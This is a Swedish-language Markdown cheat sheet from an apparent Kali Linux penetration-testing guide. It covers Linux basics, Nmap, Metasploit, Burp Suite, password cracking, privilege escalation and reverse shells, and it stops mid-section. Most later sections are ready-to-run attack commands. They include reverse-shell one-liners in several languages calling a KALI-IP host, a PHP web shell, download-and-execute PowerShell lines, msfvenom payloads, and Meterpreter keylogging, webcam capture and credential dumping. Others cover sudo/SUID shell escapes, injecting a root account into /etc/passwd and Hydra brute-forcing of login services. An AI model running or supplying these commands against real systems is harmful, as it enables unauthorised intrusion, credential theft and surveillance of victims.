# 📋 Cheat Sheets - Snabbreferens

[🏠 Tillbaka till huvudguiden](../KALI_LINUX_GUIDE_2025.md)

---

## 📚 Innehållsförteckning

1. [Linux Commands Cheat Sheet](#linux-commands)
2. [Nmap Cheat Sheet](#nmap)
3. [Metasploit Cheat Sheet](#metasploit)
4. [Burp Suite Cheat Sheet](#burp-suite)
5. [Password Cracking Cheat Sheet](#password-cracking)
6. [Privilege Escalation Cheat Sheet](#privilege-escalation)
7. [Reverse Shell Cheat Sheet](#reverse-shells)

---

## 🐧 Linux Commands Cheat Sheet {#linux-commands}

### Navigering och Filhantering

```bash
# NAVIGERING
pwd                          # Print working directory
cd /path/to/dir             # Change directory
cd ~                        # Gå till home directory
cd ..                       # Upp en nivå
cd -                        # Gå till förra directory

# LISTA FILER
ls                          # Lista filer
ls -la                      # Lista alla (inkl. dolda) med detaljer
ls -lh                      # Lista med human-readable storlekar
ls -lt                      # Lista sorterad på tid
ls -lS                      # Lista sorterad på storlek
tree                        # Visa directory-träd
tree -L 2                   # Begränsa till 2 nivåer

# SKAPA/TA BORT
touch file.txt              # Skapa tom fil
mkdir directory             # Skapa directory
mkdir -p path/to/dir        # Skapa parent directories
rm file.txt                 # Ta bort fil
rm -r directory/            # Ta bort directory rekursivt
rm -rf directory/           # Force remove (farligt!)
rmdir directory/            # Ta bort tomt directory

# KOPIERA/FLYTTA
cp source.txt dest.txt      # Kopiera fil
cp -r dir1/ dir2/           # Kopiera directory rekursivt
mv old.txt new.txt          # Byt namn/flytta
mv file.txt /path/          # Flytta till directory

# VISA INNEHÅLL
cat file.txt                # Visa hela filen
head file.txt               # Visa första 10 raderna
head -n 20 file.txt         # Visa första 20 raderna
tail file.txt               # Visa sista 10 raderna
tail -f log.txt             # Följ fil (live updates)
less file.txt               # Scrolla genom fil (q för exit)
more file.txt               # Visa fil sida för sida
```

### Sökning och Filtrering

```bash
# FIND
find / -name "*.txt"        # Hitta alla .txt-filer
find / -type f -name file   # Hitta filer
find / -type d -name dir    # Hitta directories
find / -size +100M          # Filer större än 100MB
find / -user root           # Filer ägda av root
find / -perm -4000          # SUID-filer (viktigt för privesc!)
find / -writable -type d    # Writable directories

# GREP
grep "pattern" file.txt     # Sök i fil
grep -r "pattern" /path/    # Rekursiv sökning
grep -i "pattern" file      # Case-insensitive
grep -v "pattern" file      # Invertera (visa icke-matchande)
grep -n "pattern" file      # Visa radnummer
grep -c "pattern" file      # Räkna förekomster
grep -E "regex" file        # Extended regex

# LOCATE
updatedb                    # Uppdatera database
locate file.txt             # Snabb filsökning
locate -i file              # Case-insensitive

# WHICH/WHEREIS
which python                # Hitta sökväg till binary
whereis python              # Hitta binary, source, manual
```

### Permissions och Ownership

```bash
# PERMISSIONS
chmod 644 file.txt          # rw-r--r--
chmod 755 script.sh         # rwxr-xr-x
chmod +x script.sh          # Lägg till execute
chmod -w file.txt           # Ta bort write
chmod u+x file              # User execute
chmod g+w file              # Group write
chmod o-r file              # Other remove read

# SUID/SGID
chmod u+s binary            # Sätt SUID
chmod g+s binary            # Sätt SGID
chmod +t directory/         # Sticky bit

# OWNERSHIP
chown user:group file.txt   # Ändra ägare och grupp
chown user file.txt         # Ändra endast ägare
chown -R user:group dir/    # Rekursivt
chgrp group file.txt        # Ändra endast grupp
```

### Processer och System

```bash
# PROCESSER
ps aux                      # Lista alla processer
ps aux | grep apache        # Hitta specifik process
top                         # Live process monitor
htop                        # Bättre top (om installerat)
kill PID                    # Döda process
kill -9 PID                 # Force kill
killall process_name        # Döda alla med namn
pkill process_name          # Döda med pattern

# BACKGROUND/FOREGROUND
command &                   # Kör i background
jobs                        # Lista background jobs
fg %1                       # Flytta job 1 till foreground
bg %1                       # Fortsätt job 1 i background
Ctrl+Z                      # Pausa process
Ctrl+C                      # Avbryt process

# SYSTEM INFO
uname -a                    # Kernel och system info
hostname                    # System hostname
whoami                      # Nuvarande användare
id                          # UID, GID, groups
w                           # Vem är inloggad
last                        # Senaste logins
uptime                      # Hur länge systemet varit igång
df -h                       # Diskutrymme (human-readable)
du -sh directory/           # Directory storlek
free -h                     # Minne (RAM)
```

### Nätverk

```bash
# NETWORK INTERFACES
ifconfig                    # Visa interfaces (legacy)
ip a                        # Visa IP-adresser (modern)
ip addr show                # Samma som ovan
ip link                     # Visa link status
ip route                    # Visa routing table

# CONNECTIVITY
ping 8.8.8.8                # Testa connectivity
ping -c 4 google.com        # Ping 4 gånger
traceroute google.com       # Visa route till host
mtr google.com              # Kombinerat ping/traceroute

# PORTS OCH CONNECTIONS
netstat -tulpn              # Lyssnade portar (legacy)
ss -tulpn                   # Lyssnade portar (modern)
netstat -anp                # Alla connections
lsof -i :80                 # Vad använder port 80?
lsof -i TCP                 # Alla TCP-connections

# DNS
nslookup google.com         # DNS lookup
dig google.com              # Mer detaljerad DNS lookup
host google.com             # Enkel DNS lookup

# DOWNLOAD
wget http://url/file        # Ladda ner fil
wget -O output.txt url      # Spara med annat namn
curl http://url             # Fetch URL
curl -O http://url/file     # Ladda ner fil
curl -X POST -d "data" url  # POST request
```

### Text Processing

```bash
# CUT/AWK/SED
cut -d: -f1 /etc/passwd     # Extrahera första fältet
awk '{print $1}' file       # Printa första kolumnen
awk -F: '{print $1}' passwd # Custom delimiter
sed 's/old/new/' file       # Ersätt första förekomsten
sed 's/old/new/g' file      # Ersätt alla förekomster
sed -i 's/old/new/g' file   # In-place edit

# SORT/UNIQ
sort file.txt               # Sortera
sort -r file.txt            # Reverse sort
sort -n file.txt            # Numerisk sort
uniq file.txt               # Ta bort dubletter (kräver sorterad)
sort file.txt | uniq        # Sortera och uniq
sort | uniq -c              # Räkna förekomster

# WC
wc file.txt                 # Räkna lines, words, bytes
wc -l file.txt              # Räkna endast lines
wc -w file.txt              # Räkna endast words
```

### Compression och Archives

```bash
# TAR
tar -cvf archive.tar files/ # Skapa tar
tar -czvf archive.tar.gz    # Skapa tar.gz (compressed)
tar -xvf archive.tar        # Extrahera tar
tar -xzvf archive.tar.gz    # Extrahera tar.gz
tar -tvf archive.tar        # Lista innehåll

# GZIP/BZIP2
gzip file.txt               # Komprimera (skapar file.txt.gz)
gunzip file.txt.gz          # Dekomprimera
bzip2 file.txt              # Komprimera med bzip2
bunzip2 file.txt.bz2        # Dekomprimera bzip2

# ZIP
zip archive.zip files       # Skapa zip
zip -r archive.zip dir/     # Zip directory
unzip archive.zip           # Extrahera zip
unzip -l archive.zip        # Lista innehåll
```

### Användare och Grupper

```bash
# ANVÄNDARE
useradd username            # Skapa användare
useradd -m username         # Skapa med home directory
passwd username             # Sätt lösenord
userdel username            # Ta bort användare
userdel -r username         # Ta bort med home directory
usermod -aG sudo username   # Lägg till i sudo-grupp

# GRUPPER
groupadd groupname          # Skapa grupp
groupdel groupname          # Ta bort grupp
groups username             # Visa användarens grupper
id username                 # Visa UID, GID, grupper

# SUDO
sudo command                # Kör som root
sudo -u user command        # Kör som annan användare
sudo -i                     # Root shell
sudo -l                     # Lista sudo-permissions
visudo                      # Redigera sudoers (säkert)
```

---

## 🔍 Nmap Cheat Sheet {#nmap}

### Basic Scanning

```bash
# HOST DISCOVERY
nmap 192.168.1.1            # Basic scan
nmap 192.168.1.0/24         # Scanna hela subnet
nmap 192.168.1.1-254        # Range scan
nmap -iL targets.txt        # Scan från fil

# PING SWEEP
nmap -sn 192.168.1.0/24     # Ping scan (no port scan)
nmap -Pn 192.168.1.1        # No ping (anta host uppe)
nmap -PS22,80,443 target    # TCP SYN ping
nmap -PA80 target           # TCP ACK ping
nmap -PU53 target           # UDP ping
```

### Port Scanning

```bash
# PORT SPECIFICATIONS
nmap -p 80 target           # Scanna port 80
nmap -p 22,80,443 target    # Specifika portar
nmap -p 1-65535 target      # Alla portar
nmap -p- target             # Alla portar (shorthand)
nmap --top-ports 100        # Top 100 vanligaste

# SCAN TYPES
nmap -sS target             # SYN scan (stealth, default)
nmap -sT target             # TCP connect scan
nmap -sU target             # UDP scan
nmap -sA target             # ACK scan (firewall detection)
nmap -sW target             # Window scan
nmap -sN target             # Null scan
nmap -sF target             # FIN scan
nmap -sX target             # Xmas scan
```

### Service och Version Detection

```bash
# VERSION DETECTION
nmap -sV target             # Detektera service version
nmap -sV --version-intensity 5  # Max version detection
nmap -sV --version-light    # Light version detection
nmap -A target              # Aggressive (OS, version, scripts, traceroute)

# OS DETECTION
nmap -O target              # OS detection
nmap -O --osscan-guess      # Gissa OS aggressivt
```

### NSE Scripts

```bash
# SCRIPT SCANNING
nmap -sC target             # Default scripts
nmap --script=default       # Samma som -sC
nmap --script vuln target   # Vulnerability scripts
nmap --script exploit       # Exploit scripts
nmap --script auth          # Authentication scripts
nmap --script discovery     # Discovery scripts

# SPECIFIC SCRIPTS
nmap --script http-enum target              # HTTP enumeration
nmap --script smb-vuln-ms17-010 target     # SMB EternalBlue
nmap --script ssl-heartbleed target         # Heartbleed
nmap --script ftp-anon target               # FTP anonymous
nmap --script ssh-brute target              # SSH brute force

# SCRIPT HELP
nmap --script-help vuln     # Visa help för kategori
nmap --script-help http-*   # Help för http-scripts
```

### Timing och Performance

```bash
# TIMING TEMPLATES
nmap -T0 target             # Paranoid (IDS evasion)
nmap -T1 target             # Sneaky
nmap -T2 target             # Polite
nmap -T3 target             # Normal (default)
nmap -T4 target             # Aggressive (snabbare)
nmap -T5 target             # Insane (mycket snabb)

# CUSTOM TIMING
nmap --min-rate 100 target  # Minst 100 paket/sek
nmap --max-rate 100 target  # Max 100 paket/sek
nmap --scan-delay 1s        # Delay mellan probes
```

### Output och Reporting

```bash
# OUTPUT FORMATS
nmap -oN output.txt         # Normal output
nmap -oX output.xml         # XML output
nmap -oG output.grep        # Greppable output
nmap -oA basename           # Alla format (basename.nmap, .xml, .gnmap)
nmap -v target              # Verbose
nmap -vv target             # Very verbose
nmap -d target              # Debug
```

### Firewall Evasion

```bash
# FRAGMENT PACKETS
nmap -f target              # Fragment packets
nmap -ff target             # Fragment med 16 bytes

# DECOY
nmap -D RND:10 target       # 10 random decoys
nmap -D decoy1,decoy2,ME    # Specific decoys

# SPOOF
nmap -S 1.2.3.4 target      # Spoof source IP
nmap --spoof-mac 0          # Random MAC
nmap --spoof-mac Apple      # Vendor MAC

# OTHER
nmap --data-length 25       # Append random data
nmap --ttl 64               # Set TTL
nmap --randomize-hosts      # Randomize target order
```

### Praktiska Kombinationer

```bash
# QUICK SCAN
nmap -T4 -F target          # Fast scan (100 vanligaste portar)

# STEALTH SCAN
nmap -sS -T2 -f --data-length 200 -D RND:10 target

# COMPREHENSIVE SCAN
nmap -A -T4 -p- target      # Aggressiv full port scan

# WEB SERVER ENUM
nmap -p 80,443 --script http-enum,http-headers target

# SMB VULN SCAN
nmap -p 445 --script smb-vuln-* target

# QUICK NETWORK SWEEP
nmap -T4 -F -sV 192.168.1.0/24 -oA network_sweep
```

---

## 💥 Metasploit Cheat Sheet {#metasploit}

### Grundläggande Kommandon

```bash
# STARTA METASPLOIT
msfconsole                  # Starta konsol
msfconsole -q               # Quiet (ingen banner)

# HELP
help                        # Visa hjälp
? search                    # Hjälp för specifikt kommando

# SEARCH
search vsftpd               # Sök efter exploit/modul
search type:exploit platform:windows
search cve:2017             # Sök CVE
searchsploit vsftpd         # Extern (exploit-db)

# INFO
info exploit/path/name      # Detaljerad info om modul
show options                # Visa modulens options
show payloads               # Visa kompatibla payloads
show targets                # Visa möjliga targets
show advanced               # Avancerade options
```

### Exploits och Modules

```bash
# ANVÄNDA MODUL
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp

# SÄTT OPTIONS
set RHOSTS 192.168.1.100    # Target IP
set RHOST 192.168.1.100     # Single host
set LHOST 10.10.14.5        # Din IP (för reverse shell)
set LPORT 4444              # Din lyssningsport
set PAYLOAD windows/meterpreter/reverse_tcp
setg RHOSTS 192.168.1.0/24  # Global setting

# VISA OPTIONS
show options                # Nuvarande settings
get RHOST                   # Visa specifik option
options                     # Alias för show options

# KÖRA
run                         # Kör auxiliary modul
exploit                     # Kör exploit
exploit -j                  # Kör i background (job)
exploit -z                  # Exploitera och background session
check                       # Kontrollera om target sårbar
```

### Payloads

```bash
# VANLIGA PAYLOADS
# Windows
windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_https
windows/x64/meterpreter/reverse_tcp
windows/shell/reverse_tcp

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# PAYLOAD GENERATION
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php
```

### Meterpreter Commands

```bash
# SYSTEM INFO
sysinfo                     # System information
getuid                      # Nuvarande användare
ps                          # Processer
getpid                      # Process ID
shell                       # Drop till system shell
background                  # Background session (Ctrl+Z)

# FILE SYSTEM
pwd                         # Current directory
ls                          # Lista filer
cd /path/                   # Change directory
cat file.txt                # Visa fil
download file.txt           # Ladda ner fil till Kali
upload file.exe C:\\temp\\  # Ladda upp fil till target
search -f *.txt             # Sök efter filer
edit file.txt               # Redigera fil

# NETWORK
ipconfig                    # IP config (Windows)
ifconfig                    # IP config (Linux)
route                       # Routing table
arp                         # ARP cache
netstat                     # Network connections
portfwd add -l 3389 -p 3389 -r 10.0.0.100  # Port forwarding

# PRIVILEGE ESCALATION
getprivs                    # Lista privilegier
getsystem                   # Försök få SYSTEM
use priv                    # Ladda priv extension

# HASHDUMP
hashdump                    # Dumpa Windows hashes
run post/windows/gather/hashdump
lsa_dump_sam                # Dumpa SAM
lsa_dump_secrets            # Dumpa LSA secrets

# PERSISTENCE
run persistence -X -i 60 -p 4444 -r 10.10.14.5
run exploit/windows/local/persistence

# PIVOTING
run autoroute -s 10.0.0.0/24  # Add route
run autoroute -p              # Print routes
portfwd add -l 8080 -p 80 -r 10.0.0.100

# SCREENSHOT & KEYLOGGING
screenshot                  # Ta screenshot
keyscan_start              # Starta keylogger
keyscan_dump               # Dumpa keys
keyscan_stop               # Stoppa keylogger

# WEBCAM
webcam_list                # Lista webcams
webcam_snap                # Ta bild
webcam_stream              # Stream video

# MIMIKATZ (Windows)
load kiwi                  # Ladda mimikatz
creds_all                  # Dumpa alla credentials
kiwi_cmd sekurlsa::logonpasswords
```

### Sessions och Jobs

```bash
# SESSIONS
sessions -l                 # Lista sessions
sessions -i 1              # Interagera med session 1
sessions -k 1              # Döda session 1
sessions -K                # Döda alla sessions
sessions -u 1              # Uppgradera shell till meterpreter

# JOBS
jobs -l                    # Lista background jobs
jobs -k 1                  # Döda job 1
jobs -K                    # Döda alla jobs

# MULTI/HANDLER
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit -j                 # Lyssna i background
```

### Database

```bash
# DATABASE
db_status                  # Database status
workspace                  # Lista workspaces
workspace -a pentest       # Skapa workspace
workspace pentest          # Byt workspace
db_nmap -A 192.168.1.0/24  # Nmap scan (sparar till db)
hosts                      # Lista hosts
services                   # Lista services
vulns                      # Lista vulnerabilities
```

### Auxiliary Modules

```bash
# SCANNERS
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/ftp/ftp_login

# SNIFFERS
use auxiliary/sniffer/psnuffle

# DOS
use auxiliary/dos/tcp/synflood
```

---

## 🌐 Burp Suite Cheat Sheet {#burp-suite}

### Grundläggande Setup

```bash
# STARTA BURP
burpsuite                   # Community edition
burpsuite &                 # Kör i background

# PROXY SETUP (Firefox)
Preferences → Network Settings → Manual proxy
HTTP Proxy: 127.0.0.1
Port: 8080
☑ Also use this proxy for HTTPS
```

### Proxy Tab

```bash
# INTERCEPT
Intercept is on/off       # Toggle intercept
Forward                   # Skicka request
Drop                      # Släng request
Action → Do intercept → Response  # Intercepta response också

# HTTP HISTORY
Filter bar                # Filtrera requests
Show: All / In scope / ...
Highlight items           # Färgkoda requests
Comment                   # Lägg till kommentarer
Right-click → Send to Repeater/Intruder

# OPTIONS
☑ Intercept requests based on the following rules
☑ Intercept responses based on the following rules
Match and Replace         # Auto-modifiera requests
```

### Repeater

```bash
# ANVÄNDA REPEATER
Ctrl+R / Cmd+R            # Skicka till Repeater (från Proxy/Target)
Ctrl+Space                # Send request
Ctrl+Shift+R              # Upprepa request i ny tab

# FUNKTIONER
Follow redirections       # Auto-följ 302 etc
Auto-update Content-Length
Render response           # Visa som webbläsare
Show response in browser  # Kopiera URL för browser
Compare                   # Jämför responses
```

### Intruder (Attack Types)

```bash
# ATTACK TYPES

1. SNIPER (En position, en payload-lista)
   Position: username=§test§
   Testar: admin, user, root... (en åt gången)

2. BATTERING RAM (Flera positioner, SAMMA payload)
   Position: username=§test§&password=§test§
   Testar: admin/admin, user/user, root/root

3. PITCHFORK (Flera positioner, parallella listor)
   Position: username=§user§&password=§pass§
   List 1: admin, user, root
   List 2: pass1, pass2, pass3
   Testar: admin/pass1, user/pass2, root/pass3

4. CLUSTER BOMB (Alla kombinationer)
   Position: username=§user§&password=§pass§
   Testar: admin/pass1, admin/pass2, user/pass1, user/pass2...

# PAYLOAD TYPES
Simple list               # Vanligaste
Runtime file             # Läs från fil vid körning
Numbers                  # Sequentiell/random numbers
Dates                    # Datum
Brute forcer            # Alla kombinationer av charset
Null payloads           # För timing-attacker
Character substitution  # Leet speak etc
```

### Decoder

```bash
# ENCODING TYPES
URL encoding             # %20 för space
HTML encoding            # &lt; för <
Base64                   # dGVzdA==
ASCII hex                # 74657374
Hex                      # 74 65 73 74
Octal                    # 164 145 163 164
Binary                   # 01110100...
GZIP                     # Komprimera

# HASHING
MD5                      # 098f6bcd4621d373cade4e832627b4f6
SHA-1                    # a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
SHA-256                  # 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
```

### Comparer

```bash
# JÄMFÖRA
Paste items              # Klistra in två requests/responses
Load from file           # Ladda från fil
Copy från Proxy/Repeater → Send to Comparer

# VIEW MODES
Words                    # Ordbaserad diff
Bytes                    # Bytebaserad diff
Sync views               # Synka scrolling
```

### Scanner (Pro Only)

```bash
# ACTIVE SCAN
Right-click → Scan       # Aktiv scanning
New scan → Scan mode: Crawl and audit
Audit checks             # Välj vulnerability checks

# PASSIVE SCAN
Automatically i Pro      # Körs på all trafik
```

### Extender

```bash
# POPULÄRA EXTENSIONS (BApp Store)
Active Scan++            # Fler scan checks
Autorize                 # Authorization testing
Param Miner              # Parameter discovery
J2EEScan                 # J2EE scanning
Retire.js                # JavaScript library vulns
Software Vulnerability Scanner
Upload Scanner           # File upload testing
```

### Hotkeys

```bash
# NAVIGATION
Ctrl+Shift+D             # Dashboard
Ctrl+Shift+T             # Target
Ctrl+Shift+P             # Proxy
Ctrl+Shift+I             # Intruder
Ctrl+Shift+R             # Repeater

# ACTIONS
Ctrl+R                   # Send to Repeater
Ctrl+I                   # Send to Intruder
Ctrl+Shift+B             # Send to Comparer
Ctrl+Space               # Send request (Repeater)
Ctrl+F                   # Find
Ctrl+Z                   # Undo
```

### Vanliga Attacker

```bash
# SQL INJECTION
1. Hitta parameter i Proxy
2. Send to Repeater
3. Testa: ' OR '1'='1
4. Om sårbar: Send to Intruder
5. Payload: SQL injection payloads

# XSS
1. Hitta input field
2. Test: <script>alert(1)</script>
3. Intruder med XSS payloads
4. Analysera response för executed script

# DIRECTORY TRAVERSAL
1. Hitta file parameter
2. Test: ../../etc/passwd
3. Intruder med traversal payloads
4. Leta efter fil-innehåll i response

# AUTHENTICATION BYPASS
1. Fånga login request
2. Send to Intruder
3. Attack type: Cluster bomb
4. Payload 1: Usernames
5. Payload 2: Passwords
6. Filtrera på status 200 eller "Welcome"
```

---

## 🔐 Password Cracking Cheat Sheet {#password-cracking}

### John the Ripper

```bash
# BASIC USAGE
john hash.txt                           # Auto-detect
john --format=raw-md5 hash.txt         # Specify format
john --wordlist=rockyou.txt hash.txt   # Dictionary attack

# HASH FORMATS
john --list=formats                     # Lista alla format
--format=raw-md5                        # MD5
--format=raw-sha256                     # SHA-256
--format=nt                             # NTLM
--format=bcrypt                         # bcrypt

# ATTACK MODES
john --single hash.txt                  # Single crack
john --wordlist=list.txt hash.txt       # Wordlist
john --incremental hash.txt             # Brute force
john --wordlist=list.txt --rules hash.txt  # Rules

# SHOW RESULTS
john --show hash.txt                    # Visa crackade
john --show --format=raw-md5 hash.txt

# UNIX PASSWORDS
sudo unshadow /etc/passwd /etc/shadow > unix.txt
john unix.txt

# ZIP/RAR/PDF
zip2john file.zip > hash.txt
rar2john file.rar > hash.txt
pdf2john file.pdf > hash.txt
john hash.txt
```

### Hashcat

```bash
# BASIC USAGE
hashcat -m 0 -a 0 hash.txt wordlist.txt  # MD5 dictionary

# HASH MODES (-m)
-m 0        # MD5
-m 100      # SHA-1
-m 1000     # NTLM
-m 1400     # SHA-256
-m 1800     # SHA-512 (Unix)
-m 3200     # bcrypt

# ATTACK MODES (-a)
-a 0        # Straight (dictionary)
-a 1        # Combination
-a 3        # Brute-force (mask)
-a 6        # Hybrid wordlist + mask
-a 7        # Hybrid mask + wordlist

# MASK ATTACK
?l = lowercase (abcd...)
?u = uppercase (ABCD...)
?d = digits (0123...)
?s = special (!@#$...)
?a = all

hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?d?d  # 6 lower + 2 digits

# RULES
hashcat -m 0 -a 0 hash.txt wordlist.txt -r best64.rule
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# WORKLOAD
-w 1        # Low
-w 2        # Default
-w 3        # High
-w 4        # Nightmare

# SHOW/BENCHMARK
hashcat -m 0 hash.txt --show            # Visa crackade
hashcat -b                              # Benchmark
hashcat -b -m 0                         # Benchmark MD5

# SESSION
hashcat -m 0 hash.txt wordlist.txt --session mysession
# Ctrl+C för pause
hashcat --session mysession --restore   # Återuppta
```

### Hydra

```bash
# SSH
hydra -l admin -P passwords.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# FTP
hydra -l ftp -P passwords.txt ftp://192.168.1.100

# HTTP Basic Auth
hydra -l admin -P passwords.txt http://192.168.1.100/admin

# HTTP POST Form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# RDP
hydra -l Administrator -P passwords.txt rdp://192.168.1.100

# SMB
hydra -l admin -P passwords.txt smb://192.168.1.100

# MYSQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# OPTIONS
-t 4        # Threads
-f          # Stop when found
-V          # Verbose
-o results.txt  # Output file
```

---

## 🚀 Privilege Escalation Cheat Sheet {#privilege-escalation}

### Linux Enumeration

```bash
# BASIC INFO
whoami                          # Current user
id                              # UID, GID, groups
hostname                        # Hostname
uname -a                        # Kernel version
cat /etc/issue                  # OS version
cat /etc/*-release              # Detailed OS info

# USERS
cat /etc/passwd                 # All users
cat /etc/group                  # All groups
w                               # Logged in users
last                            # Login history

# SUDO
sudo -l                         # Sudo permissions

# SUID BINARIES
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# WRITABLE FILES
find / -writable -type d 2>/dev/null        # Directories
find / -writable -type f 2>/dev/null        # Files
find / -perm -o+w -type d 2>/dev/null       # World-writable

# CRON JOBS
cat /etc/crontab
ls -la /etc/cron.*
crontab -l                      # User cron

# PROCESSES
ps aux                          # All processes
ps aux | grep root              # Root processes

# NETWORK
netstat -tulpn                  # Listening ports
ss -tulpn                       # Modern alternative
```

### Linux PrivEsc Tools

```bash
# LINPEAS
wget http://kali-ip:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt

# LINENUM
wget http://kali-ip:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t

# LINUX EXPLOIT SUGGESTER
wget http://kali-ip:8000/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Linux PrivEsc Techniques

```bash
# SUDO EXPLOITS (GTFOBins)
# sudo vim
sudo vim -c ':!/bin/sh'

# sudo find
sudo find . -exec /bin/sh \; -quit

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# SUID EXPLOITS (GTFOBins)
# SUID vim
/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# SUID find
/usr/bin/find . -exec /bin/sh -p \; -quit

# WRITABLE /etc/passwd
openssl passwd -1 -salt evil password123
echo 'evil:$1$evil$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su evil

# CRON JOB
# If script writable:
echo 'bash -i >& /dev/tcp/kali-ip/4444 0>&1' >> /path/to/cron-script.sh
```

### Windows Enumeration

```powershell
# BASIC INFO
whoami                          # Current user
whoami /priv                    # Privileges
whoami /groups                  # Groups
hostname                        # Hostname
systeminfo                      # System info

# USERS
net user                        # All users
net localgroup administrators   # Administrators
net user USERNAME               # User details

# SERVICES
sc query                        # All services
wmic service list brief         # Service info

# PROCESSES
tasklist                        # All processes
tasklist /v                     # Verbose

# NETWORK
ipconfig /all                   # IP config
netstat -ano                    # Connections

# SCHEDULED TASKS
schtasks /query /fo LIST /v

# PATCHES
wmic qfe list                   # Installed patches

# REGISTRY
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Windows PrivEsc Tools

```powershell
# WINPEAS
certutil -urlcache -f http://kali-ip:8000/winPEASx64.exe winpeas.exe
.\winpeas.exe

# POWERUP
IEX(New-Object Net.WebClient).downloadString('http://kali-ip:8000/PowerUp.ps1')
Invoke-AllChecks

# WINDOWS EXPLOIT SUGGESTER
# På Kali:
systeminfo > sysinfo.txt
python windows-exploit-suggester.py --database db.xls --systeminfo sysinfo.txt
```

---

## 🐚 Reverse Shell Cheat Sheet {#reverse-shells}

### Netcat Listeners

```bash
# BASIC LISTENER
nc -lvnp 4444               # Kali listener

# UPGRADED SHELL
python -c 'import pty;pty.spawn("/bin/bash")'  # På target
Ctrl+Z                                          # Background
stty raw -echo; fg                              # På Kali
export TERM=xterm                               # På target
```

### Bash Reverse Shells

```bash
# BASH TCP
bash -i >& /dev/tcp/KALI-IP/4444 0>&1

# BASH UDP
bash -i >& /dev/udp/KALI-IP/4444 0>&1

# /dev/tcp
0<&196;exec 196<>/dev/tcp/KALI-IP/4444; sh <&196 >&196 2>&196
```

### Python Reverse Shells

```python
# PYTHON
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PYTHON3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP Reverse Shells

```php
# PHP
php -r '$sock=fsockopen("KALI-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP Web Shell
<?php system($_GET['cmd']); ?>
# Access: http://target/shell.php?cmd=whoami
```

### Perl Reverse Shell

```perl
perl -e 'use Socket;$i="KALI-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby Reverse Shell

```ruby
ruby -rsocket -e'f=TCPSocket.open("KALI-IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat Reverse Shells

```bash
# NETCAT (traditional)
nc -e /bin/sh KALI-IP 4444

# NETCAT (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI-IP 4444 >/tmp/f

# NETCAT (OpenBSD)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc KALI-IP 4444 >/tmp/f
```

### PowerShell Reverse Shells

```powershell
# POWERSHELL ONE-LINER
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('KALI-IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# POWERSHELL ENCODED
# Generera på Kali:
echo -n "IEX(New-Object Net.WebClient).downloadString('http://KALI-IP:8000/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Kör på Windows:
powershell -enc <BASE64-STRING>
```

### MSFVenom Payloads

```bash
# LINUX
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=KALI-IP LPORT=4444 -f elf > shell.elf

# WINDOWS
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI-IP LPORT=4444 -f exe > shell.exe

# WINDOWS 64-bit
